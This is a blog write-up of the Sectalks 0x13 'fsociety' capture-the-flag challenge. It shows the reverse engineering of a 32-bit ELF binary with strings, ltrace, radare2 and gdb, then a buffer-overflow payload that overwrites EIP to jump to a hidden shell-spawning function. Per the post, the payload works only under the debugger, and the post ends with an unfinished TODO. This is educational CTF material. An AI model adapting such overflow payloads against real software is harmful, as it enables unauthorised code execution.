---
layout: post
title: "Sectalks 0x13 fsociety write up"
description: "sectalks 0x13 fsociety write up"
category: writeups
tags: [boot2root, vulnhub]
---
The second challenge named "fsociety" is a standard ELF executable.

```
root@kali:~/sectalks# file fsociety
fsociety: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.35, BuildID[sha1]=07bb8e7b91a3bb13aa027ff760b069f456453607, not stripped
```
Running strings on the executable we see a couple of things:

* The binary can likely spawn a shell
* There is a false flag stored in the binary (The correct flag should be in the "hack.Sydney{}" format)
* There is a quote from the series Mr Robot
* There is some more text

```
root@kali:~/sectalks# strings fsociety
---8<---
/bin/sh
/home/fsociety
flag{all_that_glitters_is_not_gold}
We are in a war, and we are on the losing side of it.
We are on our knees with guns to our heads, and they are picking us off one by one.
-- Darlene
b4ckd00r
-- hackers inherently trust no one, including each other --
> It will feel good if you let it,
  believing it's real makes it so.
---8<---
```
Now lets actually run the binary and see what happens.

```
root@kali:~/sectalks# ./fsociety

We are in a war, and we are on the losing side of it.
We are on our knees with guns to our heads, and they are picking us off one by one.
-- Darlene

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
It looks like binary is printing the Mr Robot quote then waits for user input. If the wrong input is given the program will exit.
We could debug the binary using gdb, but it's easier to trace the binary using ltrace to see what's going on.

```
root@kali:~/sectalks# ltrace ./fsociety
__libc_start_main(0x8048738, 1, 0xffea30d4, 0x8048880 <unfinished ...>
setbuf(0xf77a4d60, 0)                                                                                                                                                   = <void>
puts("\nWe are in a war, and we are on "...
We are in a war, and we are on the losing side of it.
)                                                                                                                            = 55
puts("We are on our knees with guns to"...We are on our knees with guns to our heads, and they are picking us off one by one.
)                                                                                                                             = 84
puts("-- Darlene\n"-- Darlene

)                                                                                                                                                    = 12
fgets(testing
"testing\n", 256, 0xf77a45a0)                                                                                                                                     = 0xffea2f2c
strcspn("testing\n", "\n")                                                                                                                                              = 7
strcmp("testing", "b4ckd00r")                                                                                                                                           = 1
strlen("testing")                                                                                                                                                       = 7
exit(-1 <no return ...>
+++ exited (status 255) +++
root@kali:~/sectalks# whatis strcmp
strcmp (3)           - compare two strings
```
By tracing the binary we see that inputted string is being compared to "b4ckd00r".
The solution to the first challenge is "b4ckd00r".
Now let's rerun the binary to find out what happen when we enter "b4ckd00r"

```
root@kali:~/sectalks# ltrace ./fsociety
__libc_start_main(0x8048738, 1, 0xffe89974, 0x8048880 <unfinished ...>
setbuf(0xf7779d60, 0)                                                                                                                                                   = <void>
puts("\nWe are in a war, and we are on "...
We are in a war, and we are on the losing side of it.
)                                                                                                                            = 55
puts("We are on our knees with guns to"...We are on our knees with guns to our heads, and they are picking us off one by one.
)                                                                                                                             = 84
puts("-- Darlene\n"-- Darlene

)                                                                                                                                                    = 12
fgets(b4ckd00r
"b4ckd00r\n", 256, 0xf77795a0)                                                                                                                                    = 0xffe897cc
strcspn("b4ckd00r\n", "\n")                                                                                                                                             = 8
strcmp("b4ckd00r", "b4ckd00r")                                                                                                                                          = 0
gets(0xffe897cc, 0x80489ee, 0xf77795a0, 0xf75c8f12testing
)                                                                                                                     = 0xffe897cc
strlen("testing")                                                                                                                                                       = 7
exit(-1 <no return ...>
+++ exited (status 255) +++
```
It looks like we've passed the first challenge by inputting "b4ckd00r" but immediately after it's prompting us for more input.
Let's dissamble the program using radare2 and use it's flow graph feature to identify it's second challenge logic.

```
root@kali:~/sectalks# r2 fsociety
[0x08048590]> aaa
[0x08048590]> pdf @ sym.main
---8<---
|           0x080487aa    e821fdffff     call sym.imp.strcspn ;sym.imp.strcspn()
|           0x080487af    c644041c00     mov byte [esp + eax + 0x1c], 0  ; [0x1c:1]=52 ; "4" @ 0x1c
|           0x080487b4    c7442404ee89.  mov dword [esp + 4], str.b4ckd00r  ; [0x80489ee:4]=0x6b633462  ; "b4ckd00r" @ 0x80489ee
|           0x080487bc    8d44241c       lea eax, dword [esp + 0x1c]    ; 0x1c  ; "4" @ 0x1c
|           0x080487c0    890424         mov dword [esp], eax
|           0x080487c3    e8e8fcffff     call sym.imp.strcmp ;sym.imp.strcmp()
|           0x080487c8    85c0           test eax, eax
|       ,=< 0x080487ca    750c           jne 0x80487d8  ;don't take the jump if the inputted string match with the string "b4ckd00r"
|       |   0x080487cc    8d44241c       lea eax, dword [esp + 0x1c]    ; 0x1c  ; "4" @ 0x1c
|       |   0x080487d0    890424         mov dword [esp], eax
|       |   0x080487d3    e808fdffff     call sym.imp.gets ;sym.imp.gets() ; here we read our second string
|       |   ; JMP XREF from 0x080487ca (sym.main)
|       `-> 0x080487d8    8d44241c       lea eax, dword [esp + 0x1c]    ; 0x1c  ; "4" @ 0x1c
|           0x080487dc    890424         mov dword [esp], eax
|           0x080487df    e86cfdffff     call sym.imp.strlen ;sym.imp.strlen() ; we get the length of the inputted string
|           0x080487e4    3dff000000     cmp eax, 0xff ; we check if the string is equal to 255
|      ,==< 0x080487e9    770c           ja 0x80487f7 ; we take the jump if the inputted string is larger than 255 - http://stackoverflow.com/questions/5540067/cmp-and-ja-question
|      |    0x080487eb    c70424ffffff.  mov dword [esp], 0xffffffff    ; [0xffffffff:4]=-1 ; -1 ; -1
|      |    0x080487f2    e849fdffff     call sym.imp.exit ;sym.imp.exit()
|      |    ; JMP XREF from 0x080487e9 (sym.main)
|      `--> 0x080487f7    c784241c0100.  mov dword [esp + 0x11c], 0     ; [0x11c:4]=0 - we truncate the string to 284 bytes
|     ,===< 0x08048802    eb48           jmp 0x804884c  ;take the jump unconditionally
|           ; JMP XREF from 0x08048861 (sym.main)
|  .------> 0x08048804    8d54241c       lea edx, dword [esp + 0x1c]    ; 0x1c  ; "4" @ 0x1c
|  |  |     0x08048808    8b84241c0100.  mov eax, dword [esp + 0x11c]   ; [0x11c:4]=0
|  |  |     0x0804880f    01d0           add eax, edx
|  |  |     0x08048811    0fb600         movzx eax, byte [eax]
|  |  |     0x08048814    3c41           cmp al, 0x41                  ; 'A' - The input can't have the uppercase letter A
|  | ,====< 0x08048816    7414           je 0x804882c
|  | ||     0x08048818    8d54241c       lea edx, dword [esp + 0x1c]    ; 0x1c  ; "4" @ 0x1c
|  | ||     0x0804881c    8b84241c0100.  mov eax, dword [esp + 0x11c]   ; [0x11c:4]=0
|  | ||     0x08048823    01d0           add eax, edx
|  | ||     0x08048825    0fb600         movzx eax, byte [eax]
|  | ||     0x08048828    3c61           cmp al, 0x61                  ; 'a' - The input can't have the lowercase letter a
|  |,=====< 0x0804882a    7518           jne 0x8048844
|  |||      ; JMP XREF from 0x08048816 (sym.main)
|  ||`----> 0x0804882c    c70424f88904.  mov dword [esp], str.___hackers_inherently_trust_no_one__including_each_other___  ; [0x80489f8:4]=0x68202d2d  ; "-- hackers inherently trust no one, including each other --" @ 0x80489f8
|  || |     0x08048833    e8e8fcffff     call sym.imp.puts ;sym.imp.puts()
|  || |     0x08048838    c70424feffff.  mov dword [esp], 0xfffffffe    ; [0xfffffffe:4]=-1 ; -2
|  || |     0x0804883f    e8fcfcffff     call sym.imp.exit ;sym.imp.exit()
|  ||       ; JMP XREF from 0x0804882a (sym.main)
|  |`-----> 0x08048844    8384241c0100.  add dword [esp + 0x11c], 1   ; this is a loop over the inputted string
|  |  |     ; JMP XREF from 0x08048802 (sym.main)
|  |  `---> 0x0804884c    8b9c241c0100.  mov ebx, dword [esp + 0x11c]   ; [0x11c:4]=0
|  |        0x08048853    8d44241c       lea eax, dword [esp + 0x1c]    ; 0x1c  ; "4" @ 0x1c
|  |        0x08048857    890424         mov dword [esp], eax
|  |        0x0804885a    e8f1fcffff     call sym.imp.strlen ;sym.imp.strlen()
|  |        0x0804885f    39c3           cmp ebx, eax
|  `======< 0x08048861    72a1           jb 0x8048804 ; jump if the loop hasn't finished looping over the imputted string
|           0x08048863    c70424348a04.  mov dword [esp], str.__It_will_feel_good_if_you_let_it__n__believing_it_s_real_makes_it_so._n  ; [0x8048a34:4]=0x7449203e  ; "> It will feel good if you let it,.  believing it's real makes it so.." @ 0x8048a34
|           0x0804886a    e8b1fcffff     call sym.imp.puts ;sym.imp.puts()
|           0x0804886f    b800000000     mov eax, 0
|           0x08048874    8b5dfc         mov ebx, dword [ebp-local_1]
|           0x08048877    c9             leave
\           0x08048878    c3             ret
```
I've added comments where I've been able to identify the logic.
In summary, the binary performs the following actions:

* The binary reads in a string
* The binary checks that the string is larger than 255 bytes otherwise it exits
* The binary truncates the string to 284 bytes
* The binary loops over the string to ensure that the string does not contains the letter "a" in both upper and lower case

If we generate a string that meets the requirement we should be able to pass the second challenge

```
root@kali:~/sectalks# echo b4ckd00r > input
root@kali:~/sectalks# python -c 'print "B" * 284 ' >> input
root@kali:~/sectalks# gdb -q fsociety
Reading symbols from fsociety...(no debugging symbols found)...done.
gdb-peda$ r < input
Starting program: /root/sectalks/fsociety < input

We are in a war, and we are on the losing side of it.
We are on our knees with guns to our heads, and they are picking us off one by one.
-- Darlene

> It will feel good if you let it,
  believing it's real makes it so.


Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x42424242 ('BBBB')
ECX: 0xf7fabda8 --> 0xf7fac870 --> 0x0
EDX: 0xf7fac870 --> 0x0
ESI: 0x1
EDI: 0xf7fab000 --> 0x1b3db0
EBP: 0x42424242 ('BBBB')
ESP: 0xffffd6c0 ("BBBBBBBB")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd6c0 ("BBBBBBBB")
0004| 0xffffd6c4 ("BBBB")
0008| 0xffffd6c8 --> 0xffffd700 --> 0x0
0012| 0xffffd6cc --> 0x0
0016| 0xffffd6d0 --> 0x0
0020| 0xffffd6d4 --> 0x0
0024| 0xffffd6d8 --> 0xf7fab000 --> 0x1b3db0
0028| 0xffffd6dc --> 0x80482e8 --> 0x62696c00 ('')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ q
```

Awesome, we now control EIP, now we need to hunt down that function which spawns a shell.
I'll be using radare to find the function name.

```
root@kali:~/sectalks# radare2 fsociety
[0x08048590]> aaa
[0x08048590]> iz~/sh
vaddr=0x08048914 paddr=0x00000914 ordinal=000 sz=8 len=7 section=.rodata type=a string=/bin/sh
[0x08048590]> pdf @ 0x08048914
Cannot find function at 0x08048914
[0x08048590]> pdf @ 0x00000914
Cannot find function at 0x00000914
[0x08048590]> /c 0x08048914
[0x08048590]> /c 8048914
0x080486bd   # 7: mov dword [ebp - 0xc], 0x8048914
[0x08048590]> pdf 7 @0x080486bd
/ (fcn) sym.fsociety_dat 148
|          ; arg int arg_33628741 @ ebp+0x8048914
|          ; var int local_0      @ ebp-0x0
|          ; var int local_3      @ ebp-0xc
|          ; var int local_4      @ ebp-0x10
|          ;-- sym.fsociety_dat:
|          0x08048690    55             push ebp
|          0x08048691    89e5           mov ebp, esp
|          0x08048693    83ec28         sub esp, 0x28
|          0x08048696    c745f4000000.  mov dword [ebp-local_3], 0
|          0x0804869d    e86efeffff     call sym.imp.getuid ;sym.imp.getuid()
|          0x080486a2    890424         mov dword [esp], eax
|          0x080486a5    e816feffff     call sym.imp.getpwuid ;sym.imp.getpwuid()
|          0x080486aa    8945f0         mov dword [ebp-local_4], eax
|          0x080486ad    837df000       cmp dword [ebp-local_4], 0
|      ,=< 0x080486b1    740a           je 0x80486bd
|      |   0x080486b3    8b45f0         mov eax, dword [ebp-local_4]
|      |   0x080486b6    8b4018         mov eax, dword [eax + 0x18]     ; [0x18:4]=0x8048590 entry0
|      |   0x080486b9    85c0           test eax, eax
|     ,==< 0x080486bb    7509           jne 0x80486c6
|     ||   ; JMP XREF from 0x080486b1 (sym.fsociety_dat)
|     ||   ;-- hit0_0:
|     |`-> 0x080486bd    c745f4148904.  mov dword [ebp-local_3], str._bin_sh  ; [0x8048914:4]=0x6e69622f  ; "/bin/sh" @ 0x8048914
|    ,===< 0x080486c4    eb09           jmp 0x80486cf
|    ||    ; JMP XREF from 0x080486bb (sym.fsociety_dat)
|    |`--> 0x080486c6    8b45f0         mov eax, dword [ebp-local_4]
|    |     0x080486c9    8b4018         mov eax, dword [eax + 0x18]     ; [0x18:4]=0x8048590 entry0
|    |     0x080486cc    8945f4         mov dword [ebp-local_3], eax
|    |     ; JMP XREF from 0x080486c4 (sym.fsociety_dat)
|    `---> 0x080486cf    e8acfeffff     call sym.imp.fork ;sym.imp.fork()
|          0x080486d4    85c0           test eax, eax
|   ,====< 0x080486d6    754a           jne 0x8048722
|   |      0x080486d8    c704241c8904.  mov dword [esp], str._home_fsociety  ; [0x804891c:4]=0x6d6f682f  ; "/home/fsociety" @ 0x804891c
|   |      0x080486df    e81cfeffff     call sym.imp.chdir ;sym.imp.chdir()
|   |      0x080486e4    c744240c0000.  mov dword [esp + 0xc], 0        ; [0xc:4]=0
|   |      0x080486ec    c74424082b89.  mov dword [esp + 8], 0x804892b  ; [0x804892b:4]=0x6c2d
|   |      0x080486f4    8b45f4         mov eax, dword [ebp-local_3]
|   |      0x080486f7    89442404       mov dword [esp + 4], eax        ; [0x4:4]=0x10101
|   |      0x080486fb    8b45f4         mov eax, dword [ebp-local_3]
|   |      0x080486fe    890424         mov dword [esp], eax
|   |      0x08048701    e86afeffff     call sym.imp.execl ;sym.imp.execl()
|   |      0x08048706    85c0           test eax, eax
|  ,=====< 0x08048708    790c           jns 0x8048716
|  ||      0x0804870a    c70424010000.  mov dword [esp], 1
|  ||      0x08048711    e82afeffff     call sym.imp.exit ;sym.imp.exit()
|  |       ; JMP XREF from 0x08048708 (sym.fsociety_dat)
|  `-----> 0x08048716    c70424000000.  mov dword [esp], 0
|   |      0x0804871d    e81efeffff     call sym.imp.exit ;sym.imp.exit()
|   |      ; JMP XREF from 0x080486d6 (sym.fsociety_dat)
|   `----> 0x08048722    c9             leave
\          0x08048723    c3             ret
[0x08048590]> q
root@kali:~/sectalks# nm -A fsociety | grep fsociety_dat
fsociety:08048690 T fsociety_dat
```
Unfortunately for some reason radare thinks the function is at 0x080486bd when in reality it's at 0x08048690.
If we generate a new input file where we input the address of the fsociety_dat function, we should be able to spawn a shell.

```
root@kali:~/sectalks# echo b4ckd00r > input
root@kali:~/sectalks# python2 -c 'import sys;sys.stdout.write("\x90\x86\x04\x08" * 71)' >> input
root@kali:~/sectalks# gdb -q fsociety
Reading symbols from fsociety...(no debugging symbols found)...done.
gdb-peda$ r < input
Starting program: /root/sectalks/fsociety < input

We are in a war, and we are on the losing side of it.
We are on our knees with guns to our heads, and they are picking us off one by one.
-- Darlene

> It will feel good if you let it,
  believing it's real makes it so.

[New process 3580]
process 3580 is executing new program: /bin/bash
[New process 3589]
[New process 3590]
process 3590 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 4 (process 3590) exited normally]
Warning: not running or target is remote
gdb-peda$ q
root@kali:~/sectalks# dmesg
[27664.090710] fsociety[3576]: segfault at ffffd700 ip 00000000ffffd700 sp 00000000ffffd6cc error 15
```

It seems like we can spawn a shell under GDB but not normally.
It appears to be related the NX bit security protections from what I've [found](http://security.stackexchange.com/questions/26604/different-types-of-segmentation-faults-in-linux) online.

# TODO: Get the exploit working normally
